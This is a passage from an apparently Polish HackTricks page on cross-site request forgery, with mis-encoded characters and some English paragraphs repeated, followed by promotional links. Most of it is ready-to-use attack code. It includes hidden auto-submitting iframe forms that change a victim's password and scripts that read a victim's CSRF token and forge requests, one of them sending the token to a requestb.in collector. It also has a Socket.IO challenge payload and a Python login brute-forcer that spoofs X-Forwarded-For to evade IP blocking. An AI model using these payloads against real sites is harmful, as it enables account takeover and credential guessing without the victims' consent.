Warto zauwaÅ¼yÄ‡, Å¼e ta technika moÅ¼e nie dziaÅ‚aÄ‡, jeÅ›li docelowa strona internetowa zaimplementowaÅ‚a dodatkowe Å›rodki bezpieczeÅ„stwa, takie jak tokeny anti-CSRF, ktÃ³re sÄ… sprawdzane po stronie serwera.
```javascript
// https://www.exploit-db.com/exploits/20009
var fileSize = fileData.length,
boundary = "OWNEDBYOFFSEC",
xhr = new XMLHttpRequest();
xhr.withCredentials = true;
xhr.open("POST", url, true);
//  MIME POST request.
xhr.setRequestHeader("Content-Type", "multipart/form-data, boundary="+boundary);
xhr.setRequestHeader("Content-Length", fileSize);
var body = "--" + boundary + "\r\n";
body += 'Content-Disposition: form-data; name="' + nameVar +'"; filename="' + fileName + '"\r\n';
body += "Content-Type: " + ctype + "\r\n\r\n";
body += fileData + "\r\n";
body += "--" + boundary + "--";

//xhr.send(body);
xhr.sendAsBinary(body);
```
### Formularz Å¼Ä…dania POST z wnÄ™trza iframe

When an HTML form is submitted, the browser sends a POST request to the specified URL. This behavior can be exploited in a Cross-Site Request Forgery (CSRF) attack by embedding the form within an iframe on a malicious website.

Kiedy formularz HTML zostaje wysÅ‚any, przeglÄ…darka wysyÅ‚a Å¼Ä…danie POST pod wskazany adres URL. To zachowanie moÅ¼e zostaÄ‡ wykorzystane w ataku Cross-Site Request Forgery (CSRF), poprzez osadzenie formularza wewnÄ…trz iframe na zÅ‚oÅ›liwej stronie internetowej.

To execute a CSRF attack using an iframe, the attacker needs to create a form with the desired parameters and target URL. This form is then embedded within an iframe on the attacker's website. When a user visits the attacker's website, the form is automatically submitted without their knowledge or consent.

Aby przeprowadziÄ‡ atak CSRF za pomocÄ… iframe, atakujÄ…cy musi stworzyÄ‡ formularz z Å¼Ä…danymi parametrami i docelowym adresem URL. NastÄ™pnie formularz ten jest osadzany wewnÄ…trz iframe na stronie internetowej atakujÄ…cego. Kiedy uÅ¼ytkownik odwiedza stronÄ™ atakujÄ…cego, formularz jest automatycznie wysyÅ‚any bez jego wiedzy i zgody.

This attack is successful if the user is authenticated on the target website and has an active session. The browser includes the user's session cookies in the POST request, making it appear as if the request originated from the user.

Atak ten jest udany, jeÅ›li uÅ¼ytkownik jest uwierzytelniony na docelowej stronie internetowej i ma aktywnÄ… sesjÄ™. PrzeglÄ…darka doÅ‚Ä…cza pliki cookie sesji uÅ¼ytkownika do Å¼Ä…dania POST, sprawiajÄ…c, Å¼e Å¼Ä…danie wydaje siÄ™ pochodziÄ‡ od uÅ¼ytkownika.

To prevent CSRF attacks, web applications can implement measures such as using anti-CSRF tokens, checking the Referer header, or implementing SameSite cookies.

Aby zapobiec atakom CSRF, aplikacje internetowe mogÄ… zastosowaÄ‡ Å›rodki takie jak uÅ¼ycie tokenÃ³w anti-CSRF, sprawdzanie nagÅ‚Ã³wka Referer lub implementowanie plikÃ³w cookie SameSite.
```html
<--! expl.html -->

<body onload="envia()">
<form method="POST"id="formulario" action="http://aplicacion.example.com/cambia_pwd.php">
<input type="text" id="pwd" name="pwd" value="otra nueva">
</form>
<body>
<script>
function envia(){document.getElementById("formulario").submit();}
</script>

<!-- public.html -->
<iframe src="2-1.html" style="position:absolute;top:-5000">
</iframe>
<h1>Sitio bajo mantenimiento. Disculpe las molestias</h1>
```
### **Ukradnij token CSRF i wyÅ›lij Å¼Ä…danie POST**

Aby przeprowadziÄ‡ atak CSRF, musisz najpierw ukraÅ›Ä‡ token CSRF z witryny docelowej. Token ten jest zazwyczaj generowany przez serwer i doÅ‚Ä…czany do formularzy lub nagÅ‚Ã³wkÃ³w Å¼Ä…daÅ„ HTTP w celu weryfikacji toÅ¼samoÅ›ci uÅ¼ytkownika.

#### **Metoda 1: Wykorzystanie podatnoÅ›ci XSS**

JeÅ›li witryna docelowa jest podatna na ataki XSS (Cross-Site Scripting), moÅ¼esz wykorzystaÄ‡ tÄ™ podatnoÅ›Ä‡ do ukrycia skryptu na stronie, ktÃ³ry bÄ™dzie kradÅ‚ token CSRF. Skrypt ten moÅ¼e nastÄ™pnie wysÅ‚aÄ‡ Å¼Ä…danie POST z ukradzionym tokenem do serwera atakujÄ…cego.

#### **Metoda 2: Wykorzystanie podatnoÅ›ci SSRF**

JeÅ›li witryna docelowa jest podatna na ataki SSRF (Server-Side Request Forgery), moÅ¼esz wykorzystaÄ‡ tÄ™ podatnoÅ›Ä‡ do wysÅ‚ania Å¼Ä…dania z serwera docelowego do serwera atakujÄ…cego. W odpowiedzi na to Å¼Ä…danie, serwer atakujÄ…cy moÅ¼e otrzymaÄ‡ token CSRF i uÅ¼yÄ‡ go do wysÅ‚ania Å¼Ä…dania POST.

#### **Metoda 3: Wykorzystanie podatnoÅ›ci w aplikacji mobilnej**

JeÅ›li witryna docelowa ma powiÄ…zanÄ… aplikacjÄ™ mobilnÄ…, moÅ¼esz poszukaÄ‡ podatnoÅ›ci w tej aplikacji, ktÃ³re umoÅ¼liwiÄ… ci uzyskanie tokena CSRF. MoÅ¼esz nastÄ™pnie uÅ¼yÄ‡ tego tokenu do wysÅ‚ania Å¼Ä…dania POST z serwera atakujÄ…cego.

Po uzyskaniu tokena CSRF, moÅ¼esz wysÅ‚aÄ‡ Å¼Ä…danie POST z ukradzionym tokenem do serwera docelowego. Ten Å¼Ä…danie zostanie uznane za prawidÅ‚owe, poniewaÅ¼ zawiera poprawny token CSRF, co pozwoli ci na wykonanie nieautoryzowanych dziaÅ‚aÅ„ w imieniu uÅ¼ytkownika.
```javascript
function submitFormWithTokenJS(token) {
var xhr = new XMLHttpRequest();
xhr.open("POST", POST_URL, true);
xhr.withCredentials = true;

// Send the proper header information along with the request
xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");

// This is for debugging and can be removed
xhr.onreadystatechange = function() {
if(xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
//console.log(xhr.responseText);
}
}

xhr.send("token=" + token + "&otherparama=heyyyy");
}

function getTokenJS() {
var xhr = new XMLHttpRequest();
// This tels it to return it as a HTML document
xhr.responseType = "document";
xhr.withCredentials = true;
// true on the end of here makes the call asynchronous
xhr.open("GET", GET_URL, true);
xhr.onload = function (e) {
if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
// Get the document from the response
page = xhr.response
// Get the input element
input = page.getElementById("token");
// Show the token
//console.log("The token is: " + input.value);
// Use the token to submit the form
submitFormWithTokenJS(input.value);
}
};
// Make the request
xhr.send(null);
}

var GET_URL="http://google.com?param=VALUE"
var POST_URL="http://google.com?param=VALUE"
getTokenJS();
```
### **KradzieÅ¼ tokena CSRF i wysÅ‚anie Å¼Ä…dania POST za pomocÄ… iframe, formularza i Ajax**

W tej technice atakujÄ…cy kradnie token CSRF z witryny docelowej i nastÄ™pnie wysyÅ‚a Å¼Ä…danie POST, wykorzystujÄ…c iframe, formularz i Ajax. PoniÅ¼ej przedstawiono kroki do wykonania tego ataku:

1. AtakujÄ…cy tworzy stronÄ™ internetowÄ…, ktÃ³ra zawiera ukryte iframe, formularz i kod Ajax.
2. W ukrytym iframe atakujÄ…cy umieszcza adres URL witryny docelowej, na ktÃ³rej znajduje siÄ™ formularz, ktÃ³ry ma zostaÄ‡ sfaÅ‚szowany.
3. W formularzu atakujÄ…cy umieszcza pola, ktÃ³re sÄ… wymagane przez formularz na witrynie docelowej, w tym pole dla tokena CSRF.
4. Za pomocÄ… kodu Ajax atakujÄ…cy wysyÅ‚a Å¼Ä…danie POST na witrynÄ™ docelowÄ…, wykorzystujÄ…c dane z formularza.
5. PoniewaÅ¼ Å¼Ä…danie jest wysyÅ‚ane z tej samej domeny, co witryna docelowa, token CSRF jest automatycznie doÅ‚Ä…czany do Å¼Ä…dania.
6. Witryna docelowa, nieÅ›wiadoma ataku, przetwarza Å¼Ä…danie i wykonuje odpowiednie akcje.

Ten atak jest skuteczny, poniewaÅ¼ atakujÄ…cy moÅ¼e wykorzystaÄ‡ zaufanie witryny docelowej do wysÅ‚ania sfaÅ‚szowanego Å¼Ä…dania. Aby siÄ™ przed nim chroniÄ‡, witryny powinny weryfikowaÄ‡ ÅºrÃ³dÅ‚o Å¼Ä…dania i sprawdzaÄ‡, czy token CSRF jest prawidÅ‚owy.
```html
<form id="form1" action="http://google.com?param=VALUE" method="post" enctype="multipart/form-data">
<input type="text" name="username" value="AA">
<input type="checkbox" name="status" checked="checked">
<input id="token" type="hidden" name="token" value="" />
</form>

<script type="text/javascript">
function f1(){
x1=document.getElementById("i1");
x1d=(x1.contentWindow||x1.contentDocument);
t=x1d.document.getElementById("token").value;

document.getElementById("token").value=t;
document.getElementById("form1").submit();
}
</script>
<iframe id="i1" style="display:none" src="http://google.com?param=VALUE" onload="javascript:f1();"></iframe>
```
### **Ukradnij token CSRF i wyÅ›lij Å¼Ä…danie POST za pomocÄ… iframe i formularza**

Aby ukraÅ›Ä‡ token CSRF i wysÅ‚aÄ‡ Å¼Ä…danie POST za pomocÄ… iframe i formularza, wykonaj nastÄ™pujÄ…ce kroki:

1. UtwÃ³rz stronÄ™ internetowÄ…, na ktÃ³rej znajduje siÄ™ zÅ‚oÅ›liwy kod.
2. Na tej stronie umieÅ›Ä‡ iframe, ktÃ³ry bÄ™dzie wczytywaÅ‚ docelowÄ… stronÄ™, na ktÃ³rej znajduje siÄ™ formularz.
3. WewnÄ…trz iframe dodaj skrypt JavaScript, ktÃ³ry bÄ™dzie wykonywaÅ‚ nastÄ™pujÄ…ce czynnoÅ›ci:
   - Pobierz token CSRF z formularza na docelowej stronie.
   - UtwÃ³rz nowy formularz i ustaw jego atrybuty, takie jak akcja (URL docelowej strony) i metoda (POST).
   - Dodaj ukryte pole do formularza i ustaw jego wartoÅ›Ä‡ na skradziony token CSRF.
   - Dodaj formularz do drzewa DOM.
   - WywoÅ‚aj metodÄ™ submit na formularzu, aby wysÅ‚aÄ‡ Å¼Ä…danie POST z ukradzionym tokenem CSRF.
4. Po wykonaniu tych krokÃ³w, Å¼Ä…danie POST zostanie wysÅ‚ane na docelowÄ… stronÄ™, wykorzystujÄ…c skradziony token CSRF.

PamiÄ™taj, Å¼e wykorzystywanie tej techniki jest nielegalne i narusza prywatnoÅ›Ä‡ innych osÃ³b. Zawsze dziaÅ‚aj zgodnie z prawem i etykÄ….
```html
<iframe id="iframe" src="http://google.com?param=VALUE" width="500" height="500" onload="read()"></iframe>

<script>
function read()
{
var name = 'admin2';
var token = document.getElementById("iframe").contentDocument.forms[0].token.value;
document.writeln('<form width="0" height="0" method="post" action="http://www.yoursebsite.com/check.php"  enctype="multipart/form-data">');
document.writeln('<input id="username" type="text" name="username" value="' + name + '" /><br />');
document.writeln('<input id="token" type="hidden" name="token" value="' + token + '" />');
document.writeln('<input type="submit" name="submit" value="Submit" /><br/>');
document.writeln('</form>');
document.forms[0].submit.click();
}
</script>
```
### **Ukradnij token i wyÅ›lij go za pomocÄ… 2 ramek (iframes)**
```html
<script>
var token;
function readframe1(){
token = frame1.document.getElementById("profile").token.value;
document.getElementById("bypass").token.value = token
loadframe2();
}
function loadframe2(){
var test = document.getElementbyId("frame2");
test.src = "http://requestb.in/1g6asbg1?token="+token;
}
</script>

<iframe id="frame1" name="frame1" src="http://google.com?param=VALUE" onload="readframe1()"
sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-top-navigation"
height="600" width="800"></iframe>

<iframe id="frame2" name="frame2"
sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-top-navigation"
height="600" width="800"></iframe>
<body onload="document.forms[0].submit()">
<form id="bypass" name"bypass" method="POST" target="frame2" action="http://google.com?param=VALUE" enctype="multipart/form-data">
<input type="text" name="username" value="z">
<input type="checkbox" name="status" checked="">
<input id="token" type="hidden" name="token" value="0000" />
<button type="submit">Submit</button>
</form>
```
### **POSTUkradnij token CSRF za pomocÄ… Ajaxa i wyÅ›lij Å¼Ä…danie POST z formularzem**

To steal a CSRF token using Ajax and send a POST request with a form, you can use the following steps:

1. Use Ajax to send a GET request to the target website and retrieve the HTML content of the page containing the CSRF token.
2. Parse the HTML content to extract the CSRF token value.
3. Create a new HTML form with the necessary input fields, including the stolen CSRF token.
4. Use Ajax to send a POST request to the target website, including the form data.
5. The target website will process the POST request, considering it as a legitimate request due to the presence of the valid CSRF token.
6. As a result, the attacker can perform actions on behalf of the victim without their knowledge or consent.

Keep in mind that this technique can be used for malicious purposes and is considered a security vulnerability. It is important to implement proper CSRF protection mechanisms to prevent such attacks.
```html
<body onload="getData()">

<form id="form" action="http://google.com?param=VALUE" method="POST" enctype="multipart/form-data">
<input type="hidden" name="username" value="root"/>
<input type="hidden" name="status" value="on"/>
<input type="hidden" id="findtoken" name="token" value=""/>
<input type="submit" value="valider"/>
</form>

<script>
var x = new XMLHttpRequest();
function getData() {
x.withCredentials = true;
x.open("GET","http://google.com?param=VALUE",true);
x.send(null);
}
x.onreadystatechange = function() {
if (x.readyState == XMLHttpRequest.DONE) {
var token = x.responseText.match(/name="token" value="(.+)"/)[1];
document.getElementById("findtoken").value = token;
document.getElementById("form").submit();
}
}
</script>
```
### CSRF z Socket.IO

Cross-Site Request Forgery (CSRF) to atak, ktÃ³ry polega na wykorzystaniu zaufania serwera do wykonania nieautoryzowanych akcji w imieniu uÅ¼ytkownika. W przypadku aplikacji opartych na Socket.IO, atak CSRF moÅ¼e byÄ‡ wykorzystany do manipulacji komunikacji w czasie rzeczywistym miÄ™dzy klientem a serwerem.

#### SposÃ³b dziaÅ‚ania ataku CSRF z Socket.IO

1. AtakujÄ…cy tworzy zÅ‚oÅ›liwÄ… stronÄ™ internetowÄ…, ktÃ³ra zawiera kod JavaScript, ktÃ³ry wykorzystuje Socket.IO do nawiÄ…zania poÅ‚Ä…czenia z serwerem.
2. UÅ¼ytkownik odwiedza zÅ‚oÅ›liwÄ… stronÄ™, co powoduje nawiÄ…zanie poÅ‚Ä…czenia z serwerem Socket.IO.
3. Serwer Socket.IO uznaje poÅ‚Ä…czenie za autoryzowane, poniewaÅ¼ nie sprawdza, czy Å¼Ä…danie pochodzi z zaufanego ÅºrÃ³dÅ‚a.
4. AtakujÄ…cy wykorzystuje to autoryzowane poÅ‚Ä…czenie do wysyÅ‚ania zÅ‚oÅ›liwych Å¼Ä…daÅ„ na serwer w imieniu uÅ¼ytkownika.
5. Serwer wykonuje zÅ‚oÅ›liwe Å¼Ä…dania, nieÅ›wiadomy, Å¼e zostaÅ‚y one wysÅ‚ane przez atakujÄ…cego.

#### Zapobieganie atakom CSRF z Socket.IO

Aby zapobiec atakom CSRF z Socket.IO, naleÅ¼y zastosowaÄ‡ odpowiednie zabezpieczenia:

1. Weryfikacja ÅºrÃ³dÅ‚a Å¼Ä…dania: Serwer Socket.IO powinien sprawdzaÄ‡, czy Å¼Ä…danie pochodzi z zaufanego ÅºrÃ³dÅ‚a, takiego jak domena aplikacji.
2. UÅ¼ywanie tokenÃ³w CSRF: Serwer powinien generowaÄ‡ unikalne tokeny CSRF dla kaÅ¼dego Å¼Ä…dania i wymagaÄ‡, aby klient przesyÅ‚aÅ‚ ten token wraz z Å¼Ä…daniem. Serwer powinien sprawdzaÄ‡, czy token jest prawidÅ‚owy przed wykonaniem Å¼Ä…dania.
3. Ustawianie nagÅ‚Ã³wka SameSite: Ustawienie nagÅ‚Ã³wka SameSite na wartoÅ›Ä‡ "Strict" lub "Lax" moÅ¼e pomÃ³c w ograniczeniu atakÃ³w CSRF, uniemoÅ¼liwiajÄ…c przesyÅ‚anie Å¼Ä…daÅ„ z innych stron.
4. UÅ¼ywanie mechanizmÃ³w uwierzytelniania: Wprowadzenie mechanizmÃ³w uwierzytelniania, takich jak logowanie i uwierzytelnianie dwuskÅ‚adnikowe, moÅ¼e dodatkowo zabezpieczyÄ‡ aplikacjÄ™ przed atakami CSRF.

Wprowadzenie tych zabezpieczeÅ„ pomoÅ¼e w minimalizacji ryzyka atakÃ³w CSRF z wykorzystaniem Socket.IO. WaÅ¼ne jest, aby pamiÄ™taÄ‡ o aktualizowaniu i monitorowaniu zabezpieczeÅ„ w celu zapewnienia ochrony przed nowymi zagroÅ¼eniami.
```html
<script src="https://cdn.jsdelivr.net/npm/socket.io-client@2/dist/socket.io.js"></script>
<script>
let socket = io('http://six.jh2i.com:50022/test');

const username = 'admin'

socket.on('connect', () => {
console.log('connected!');
socket.emit('join', {
room: username
});
socket.emit('my_room_event', {
data: '!flag',
room: username
})

});
</script>
```
## CSRF Brute Force Logowania

Kod moÅ¼e byÄ‡ uÅ¼ywany do Brut Force formularza logowania za pomocÄ… tokena CSRF (UÅ¼ywa rÃ³wnieÅ¼ nagÅ‚Ã³wka X-Forwarded-For w celu prÃ³by obejÅ›cia moÅ¼liwego czarnolistowania IP):
```python
import request
import re
import random

URL = "http://10.10.10.191/admin/"
PROXY = { "http": "127.0.0.1:8080"}
SESSION_COOKIE_NAME = "BLUDIT-KEY"
USER = "fergus"
PASS_LIST="./words"

def init_session():
#Return CSRF + Session (cookie)
r = requests.get(URL)
csrf = re.search(r'input type="hidden" id="jstokenCSRF" name="tokenCSRF" value="([a-zA-Z0-9]*)"', r.text)
csrf = csrf.group(1)
session_cookie = r.cookies.get(SESSION_COOKIE_NAME)
return csrf, session_cookie

def login(user, password):
print(f"{user}:{password}")
csrf, cookie = init_session()
cookies = {SESSION_COOKIE_NAME: cookie}
data = {
"tokenCSRF": csrf,
"username": user,
"password": password,
"save": ""
}
headers = {
"X-Forwarded-For": f"{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}"
}
r = requests.post(URL, data=data, cookies=cookies, headers=headers, proxies=PROXY)
if "Username or password incorrect" in r.text:
return False
else:
print(f"FOUND {user} : {password}")
return True

with open(PASS_LIST, "r") as f:
for line in f:
login(USER, line.strip())
```
## NarzÄ™dzia <a href="#tools" id="tools"></a>

* [https://github.com/0xInfection/XSRFProbe](https://github.com/0xInfection/XSRFProbe)
* [https://github.com/merttasci/csrf-poc-generator](https://github.com/merttasci/csrf-poc-generator)

## OdwoÅ‚ania

* [https://portswigger.net/web-security/csrf](https://portswigger.net/web-security/csrf)
* [https://portswigger.net/web-security/csrf/bypassing-token-validation](https://portswigger.net/web-security/csrf/bypassing-token-validation)
* [https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses](https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses)
* [https://www.hahwul.com/2019/10/bypass-referer-check-logic-for-csrf.html](https://www.hahwul.com/2019/10/bypass-referer-check-logic-for-csrf.html)

â€‹

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

DoÅ‚Ä…cz do serwera [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy), aby komunikowaÄ‡ siÄ™ z doÅ›wiadczonymi hakerami i Å‚owcami bÅ‚Ä™dÃ³w!

**WglÄ…d w hakerstwo**\
Zajmuj siÄ™ treÅ›ciami, ktÃ³re zagÅ‚Ä™biajÄ… siÄ™ w emocje i wyzwania hakerstwa

**AktualnoÅ›ci na Å¼ywo o hakerstwie**\
BÄ…dÅº na bieÅ¼Ä…co z szybkim tempem Å›wiata hakerstwa dziÄ™ki aktualnym wiadomoÅ›ciom i wglÄ…dom

**Najnowsze ogÅ‚oszenia**\
BÄ…dÅº na bieÅ¼Ä…co z najnowszymi programami bug bounty i waÅ¼nymi aktualizacjami platformy

**DoÅ‚Ä…cz do nas na** [**Discordzie**](https://discord.com/invite/N3FrSbmwdy) i zacznij wspÃ³Å‚pracowaÄ‡ z najlepszymi hakerami juÅ¼ dziÅ›!

<details>

<summary><strong>Naucz siÄ™ hakowaÄ‡ AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ **reklamÄ™ swojej firmy w HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF**, sprawdÅº [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* ZdobÄ…dÅº [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel siÄ™ swoimi sztuczkami hakerskimi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
